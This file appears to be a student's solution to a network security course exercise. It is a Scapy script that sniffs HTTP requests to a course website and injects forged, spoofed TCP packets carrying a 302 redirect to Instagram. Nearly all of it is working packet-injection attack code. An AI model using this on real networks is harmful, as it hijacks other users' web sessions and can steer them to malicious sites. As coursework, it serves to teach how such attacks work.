import q1
import scapy.all as S
import urllib.parse as urlparse
from typing import Tuple
import re

RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    
    
    #get the raw part
    if S.Raw in packet :
        load = packet[S.Raw].load.decode('ascii')
        
        parsed_data = urlparse.urlparse(load)
        try:
            host = re.search(r'Host: (\S+)', parsed_data.path)
        except:
            return None
        if not host:
            return None
        
        host = host.group(1)
        
        if WEBSITE ==  host:
            
            #if we get here then there is a log in attempt
            #injecting the redirection:

            if not S.IP in packet:
                return None

    
            ip_dst = packet[S.IP].src
            ip_src = packet[S.IP].dst
    
            # find sport, dport and flags
            if not S.TCP in packet:
                return None
    
            tcp_dport = packet[S.TCP].sport
            tcp_sport = packet[S.TCP].dport # supposed to be 80 - http request
    
            tcp_seq_num = packet[S.TCP].ack 
            tcp_ack_num = packet[S.TCP].seq + len(packet[S.Raw])

            # create redirection packet
            s = S.IP(src=ip_src, dst=ip_dst)/S.TCP(sport=tcp_sport, dport=tcp_dport, flags='FPA', ack=tcp_ack_num, seq=tcp_seq_num)/RESPONSE
            
            return s
        
    
    return None
    
        

def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
